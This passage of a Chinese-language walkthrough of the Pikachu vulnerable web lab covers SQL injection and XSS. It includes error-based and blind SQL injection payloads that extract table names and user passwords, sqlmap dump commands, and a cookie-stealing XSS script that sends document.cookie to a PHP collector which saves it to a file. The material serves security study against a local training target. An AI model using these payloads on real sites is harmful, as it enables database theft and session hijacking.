title="xx型注入"></a>xx型注入</h3><p>同样是闭合问题，测试可知，估计是(‘xxx’)这种类型。</p><p>剩下的，同上方式了。</p><h3 id="insert-注入"><a href="#insert-注入" class="headerlink" title="insert 注入"></a>insert 注入</h3><p>一个登陆界面，我们先注册账号，然后抓包看看。<br><img src="https://s2.loli.net/2022/02/27/lj43UANbzMIs7P2.png"><br>采用post传参，username=123&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit。</p><p>注册采用的insert插入数据，我们可以推断出sql语句如下。</p><pre><code>insert into member(username,password,sex,phonenum,email,add) values(&#39;123&#39;,&#39;123&#39;,&#39;xx&#39;,&#39;xx&#39;,&#39;xx&#39;,&#39;xx&#39;)sqli.reg.phpinsert into member(username,pw,sex,phonenum,email,address) values(&#39;&#123;$getdata[&#39;username&#39;]&#125;&#39;,md5(&#39;&#123;$getdata[&#39;password&#39;]&#125;&#39;),&#39;&#123;$getdata[&#39;sex&#39;]&#125;&#39;,&#39;&#123;$getdata[&#39;phonenum&#39;]&#125;&#39;,&#39;&#123;$getdata[&#39;email&#39;]&#125;&#39;,&#39;&#123;$getdata[&#39;add&#39;]&#125;&#39;)</code></pre><p>而且关于这些数据是数字型还是字符型，我们可以通过’来测试。常理来说应该是字符型。</p><p>接下来就是如何泄露的问题了。联合注入不可用，改为报错注入。</p><p>报错注入就是利用某些函数参数的特点，比如说updatexml的第二个参数，需要满足xpath语法，但是我们拼接一下其他字符，就不满足，就会报错，然后会把查询结果放在报错信息中。</p><pre><code>playload：username= hehe&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;&amp;password=123&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit实际执行的sql语句。insert into member(username,password,sex,phonenum,email,add) values(&#39;hello&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;&#39;,&#39;111&#39;,&#39;222&#39;,&#39;333&#39;,&#39;444&#39;,&#39;555&#39;)</code></pre><p>爆表，这里是使用了substr函数，因为updatexml显示的字符长度有限。</p><pre><code>username= &#39;or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) or &#39;&amp;password=666666&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</code></pre><p>然后剩下有区别的就是爆数据了，但是有点奇怪</p><pre><code>之前：select username,password from users现在：select group_concat(concat(username,&#39;^&#39;,password)) from users</code></pre><p>如果我们采用之前的，会出现这种情况。<br><img src="https://s2.loli.net/2022/02/27/nPYWMuBsL5jJRoO.png"><br>所以需要group_concat将其所有查到的数据弄成一行。</p><pre><code>username= &#39;or updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#39;^&#39;,password)) from users),1,31),0x7e),1) or &#39;&amp;password=666666&amp;sex=&amp;phonenum=&amp;email=&amp;add=&amp;submit=submit</code></pre><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>和insert注入差不多。</p><p>php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$html1</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;sex&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;phonenum&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;add&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line"><span class="comment">//        $getdata=escape($link, $_POST);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//未转义,形成注入,sql操作类型为update</span></span><br><span class="line">        <span class="variable">$getdata</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;update member set sex=&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,phonenum=&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,address=&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;,email=&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="subst">&#123;$_SESSION[&#x27;sqli&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">1</span> || mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            header(<span class="string">&quot;location:sqli_mem.php&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$html1</span>.=<span class="string">&#x27;修改失败，请重试&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须post所有值都不为空才会有更新这一说法。</p><p>update语句为</p><pre><code>update member set sex=&#39;&#123;$getdata[&#39;sex&#39;]&#125;&#39;,phonenum=&#39;&#123;$getdata[&#39;phonenum&#39;]&#125;&#39;,address=&#39;&#123;$getdata[&#39;add&#39;]&#125;&#39;,email=&#39;&#123;$getdata[&#39;email&#39;]&#125;&#39; where username=&#39;&#123;$_SESSION[&#39;sqli&#39;][&#39;username&#39;]&#125;&#39;</code></pre><p>所以可以采用和insert差不多的构造。</p><pre><code>playload：其中的#可以不去掉。sex=11&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;#&amp;phonenum=123&amp;add=123&amp;email=123%40123.com&amp;submit=submit实际sql语句update member set sex=&#39;11&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) &#39;&#39; 无#：update member set sex=&#39;11&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;&#39; ,phonenum=&#39;123&#39;,address=&#39;123&#39;,email=&#39;123&#39; where username=&#39;&#123;$_SESSION[&#39;sqli&#39;][&#39;username&#39;]&#125;&#39;</code></pre><p>剩下的就都差不多了。</p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>先抓包看看。<br><img src="https://s2.loli.net/2022/02/27/Q4RAFLErghXspyH.png"><br>get方式，传入id。</p><p>然后看看源码，del.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(array_key_exists(<span class="string">&#x27;id&#x27;</span>, <span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;delete from message where id=<span class="subst">&#123;$_GET[&#x27;id&#x27;]&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(mysqli_affected_rows(<span class="variable">$link</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        header(<span class="string">&quot;location:sqli_del.php&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p style=&#x27;color: red&#x27;&gt;删除失败,检查下数据库是不是挂了&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>delete语句为</p><pre><code>delete from message where id=&#123;$_GET[&#39;id&#39;]&#125;</code></pre><p>采用union联合查询貌似不行，还是用or 报错注入。</p><pre><code>id=67 or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)#sql语句：delete from message where id=67 or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1)#</code></pre><p>得到数据表名称。</p><p>其他一致。</p><h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><p>tips给了账号和密码，然后登陆后会发现显示了一些请求头的信息。</p><p>主要漏洞点在sqli_header.php的这个地方。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//直接获取前端过来的头信息,没人任何处理,留下安全隐患</span></span><br><span class="line"><span class="variable">$remoteipadd</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$useragent</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="variable">$httpaccept</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>];</span><br><span class="line"><span class="variable">$remoteport</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_PORT&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里把http的头信息存到数据库里面去了，但是存进去之前没有进行转义，导致SQL注入漏洞</span></span><br><span class="line"><span class="variable">$query</span>=<span class="string">&quot;insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(&#x27;<span class="subst">$is_login_id</span>&#x27;,&#x27;<span class="subst">$remoteipadd</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;,&#x27;<span class="subst">$httpaccept</span>&#x27;,&#x27;<span class="subst">$remoteport</span>&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">    setcookie(<span class="string">&#x27;ant[uname]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-3600</span>);</span><br><span class="line">    setcookie(<span class="string">&#x27;ant[pw]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,time()<span class="number">-3600</span>);</span><br><span class="line">    header(<span class="string">&quot;location:sqli_header_login.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>insert插入语句</p><pre><code>insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(&#39;$is_login_id&#39;,&#39;$remoteipadd&#39;,&#39;$useragent&#39;,&#39;$httpaccept&#39;,&#39;$remoteport&#39;)</code></pre><p>所以注入就是insert注入的方法，只不过playload需要写在请求头的相应位置。<br><img src="https://s2.loli.net/2022/02/28/FK9Ht3EizLfVmPk.png"><br>爆破其他数据同insert注入</p><h3 id="盲注-boolean"><a href="#盲注-boolean" class="headerlink" title="盲注-boolean"></a>盲注-boolean</h3><p>boolean注入（布尔盲注),简单来说就是没有报错回显，只会返回正误。</p><p>而我们就可以采用or的形式判断关于名称的一些信息。</p><p>比如说这个环境。正确输入username和错误输入username如下。<br><img src="https://s2.loli.net/2022/03/01/U23czN4nhXEWDAI.png"></p><p>然后看看php源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];<span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;<span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line">    <span class="comment">//mysqi_query不打印错误描述,即使存在注入,也不好判断</span></span><br><span class="line">    <span class="variable">$result</span>=mysqli_query(<span class="variable">$link</span>, <span class="variable">$query</span>);<span class="comment">//</span></span><br><span class="line"><span class="comment">//     $result=execute($link, $query);</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> &amp;&amp; mysqli_num_rows(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;your uid:<span class="subst">&#123;$id&#125;</span> &lt;br /&gt;your email is: <span class="subst">&#123;$email&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;您输入的username不存在，请重新输入！&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只会返回正确或者错误的字符。</p><pre><code>playload：1&#39; or 1=1#//不可行，sql语句为select id,email from member where username=&#39;1&#39; or 1=1#。会返回所有的id和email，导致mysqli_num_rows不是一行，返回username不正常。playload：lili&#39; and 1=1#//可行，我们这里是事先知道了lili一个名称，使用and，同真为真，并且也只会返回lili的id和email，是一行数据。</code></pre><p>所以可以采用下面的playload来实现获得database()的字符串长度。</p><pre><code>playload：lili&#39; and (length(database()))&gt;n测得长度为7(pikachu)</code></pre><p>然后就可以单字节爆破了，采用substr和ord或者ascii，进行遍历0~127字符，共7轮，用python脚本实现。</p><pre><code>playload：lili&#39; and ord(substr(database(),1,1))=112#lili&#39; and ascii(substr(database(),1,1))=112#得到数据库名称pikachu</code></pre><p>然后是爆破数据表，也差不多。</p><pre><code>playload,弄成一行：lili&#39; and ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=104#//偏移，每次弄一个lili&#39; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=108httpinfo,member,message,users,xssblind</code></pre><p>然后就是爆破字段名称了。</p><p>都差不多。</p><p>sqlmap试试。</p><p>获取所有数据库名称</p><pre><code>python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=查询&quot; --dbs  --batch</code></pre><p><img src="https://s2.loli.net/2022/03/01/Ywh7Rle9k8XU5PJ.png"><br>获取数据表名称</p><pre><code>python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=查询&quot; -D pikachu --tables --batch</code></pre><p><img src="https://s2.loli.net/2022/03/01/e3AmcKR5XMQk8EO.png"><br>获取所有字段名称。</p><pre><code>python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=查询&quot; -D pikachu -T users --columns --batch</code></pre><p><img src="https://s2.loli.net/2022/03/01/rjt7gaTuJ2dFvme.png"><br>获取数据。</p><pre><code>python sqlmap.py -u &quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=查询&quot; -D pikachu -T users --dump --batch</code></pre><p><img src="https://s2.loli.net/2022/03/01/Bj1z9EGLp2aHF3v.png"></p><h3 id="盲注-time"><a href="#盲注-time" class="headerlink" title="盲注-time"></a>盲注-time</h3><p>无论输入什么 回显都一样，无法通过回显判断了，但是可以换另一种方法，就是时间注入。</p><p>就是根据返回数据的时间差来确定是否成功。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];<span class="comment">//这里没有做任何处理，直接拼到select里面去了</span></span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;select id,email from member where username=&#x27;<span class="subst">$name</span>&#x27;&quot;</span>;<span class="comment">//这里的变量是字符型，需要考虑闭合</span></span><br><span class="line">    <span class="variable">$result</span>=mysqli_query(<span class="variable">$link</span>, <span class="variable">$query</span>);<span class="comment">//mysqi_query不打印错误描述</span></span><br><span class="line"><span class="comment">//     $result=execute($link, $query);</span></span><br><span class="line"><span class="comment">//    $html.=&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span> &amp;&amp; mysqli_num_rows(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$data</span>=mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span>=<span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">            <span class="variable">$email</span>=<span class="variable">$data</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">            <span class="comment">//这里不管输入啥,返回的都是一样的信息,所以更加不好判断</span></span><br><span class="line">            <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p class=&#x27;notice&#x27;&gt;i don&#x27;t care who you are!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，同样限制了返回数据只能有一行，所以尽量还是不要使用or了。</p><p>爆破数据库名称。</p><pre><code>playload：lili&#39; and if(ord(substr(database(),1,1))=112,sleep(5),0)#如果返回时间大于5秒，则表示正确。</code></pre><p>剩下的爆破基本一样。</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>XSS（跨站脚本）概述</p><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;<br>    2.存储型XSS;<br>    3.DOM型XSS;</p><p>XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。</p><p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。</p><p>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。</p><p>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:<br>  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;<br>  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p><p>原理：简单来说就是如果网站未对输入内容进行过滤，我们可以输入一些闭合加JavaScript的代码，然后前端打印我们输入的字符时，就会执行这些javacript代码。</p><h3 id="反射型xss-get"><a href="#反射型xss-get" class="headerlink" title="反射型xss(get)"></a>反射型xss(get)</h3><p><img src="https://s2.loli.net/2022/03/02/zKVuEPTLMmAeZrH.png"><br>所以可以输入，<script>alert("The_Itach1")</script>，然后点击submit。<br><img src="https://s2.loli.net/2022/03/02/96gIAhVTcjbHBGW.png"></p><p>相当于是这样。</p><pre><code>&lt;p class=&quot;notice&quot;&gt; &lt;script&gt;alert(&quot;The_Itach1&quot;)&lt;/script&gt; &lt;/p&gt;执行了我们的script语句。</code></pre><h3 id="反射型xss-post"><a href="#反射型xss-post" class="headerlink" title="反射型xss(post)"></a>反射型xss(post)</h3><p>多了一个登陆，给了admin，123456，登陆成功会生成cookie。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&lt;p&gt;please input username and password!&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="literal">null</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里没有使用预编译方式,而是使用的拼接SQL,所以需要手动转义防止SQL注入</span></span><br><span class="line">        <span class="variable">$username</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">        <span class="variable">$password</span>=escape(<span class="variable">$link</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span>=<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=md5(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span>=execute(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">if</span>(mysqli_num_rows(<span class="variable">$result</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="variable">$data</span>=mysqli_fetch_assoc(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//登录时，生成cookie,1个小时有效期，供其他页面判断</span></span><br><span class="line">            setcookie(<span class="string">&#x27;ant[uname]&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>],time()+<span class="number">3600</span>);</span><br><span class="line">            setcookie(<span class="string">&#x27;ant[pw]&#x27;</span>,sha1(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])),time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            header(<span class="string">&quot;location:xss_reflected_post.php&quot;</span>);</span><br><span class="line"><span class="comment">//            echo &#x27;&quot;&lt;script&gt;windows.location.href=&quot;xss_reflected_post.php&quot;&lt;/script&gt;&#x27;;</span></span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$html</span> =<span class="string">&quot;&lt;p&gt;username or password error!&lt;/p&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span> =<span class="string">&quot;&lt;p&gt;please input username and password!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/03/02/baDuSoI3Qz8c4Yj.png"></p><p>获取cookie的script代码。</p><p>先在<a href="http://127.0.0.1/1.php%E7%9A%841.php%E4%B8%AD%E5%86%99%E5%85%A5%E5%A6%82%E4%B8%8B%E8%AF%AD%E5%8F%A5">http://127.0.0.1/1.php的1.php中写入如下语句</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$cookie</span>;</span><br><span class="line">    file_put_contents(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后输入<script>document.location='<a href="http://127.0.0.1/1.php?x=&#39;+document.cookie">http://127.0.0.1/1.php?x=&#39;+document.cookie</a>;</script>，就可以获得cookie了。</p><h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><p>这种xss一般是留言板，评论，网站会将我们输入的内容存储到数据，然后显现到前端中，所以当存在xss漏洞时，只要有人访问这个网站，都会执行script语句。照成一种持续化的xss攻击。</p><p>我们还是输入<script>alert("The_Itach1")</script>，然后会发现每次我们访问这个网站，都会弹出窗口。</p><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><p>实际上就是JavaScript的html Dom，通过 HTML DOM，可访问 JavaScript HTML 文档的所有元素，也可以修改元素。<a href="https://www.runoob.com/js/js-htmldom.html">https://www.runoob.com/js/js-htmldom.html</a></p><p>来看看相应部分。<br><img src="https://s2.loli.net/2022/03/02/EJuoaMsFOW9RdZl.png"><br>所以<a href='"+str+"'>what do you see?</a>这个里面的str可控，所以我们可以简单按照给的两种方式构造闭合下</p><p>playload1：</p><pre><code>str=&#39;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></pre><p><img src="https://s2.loli.net/2022/03/02/Wq9fkOoyux3d2B6.png"><br>playload2：</p><pre><code>playload2：&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code></pre><p><img src="https://s2.loli.net/2022/03/02/xwVI9LTOkW1J8Gv.png"></p><h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>会先蹦出第一个链接，点击第一个链接会触发js代码。</p><p>js代码如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span 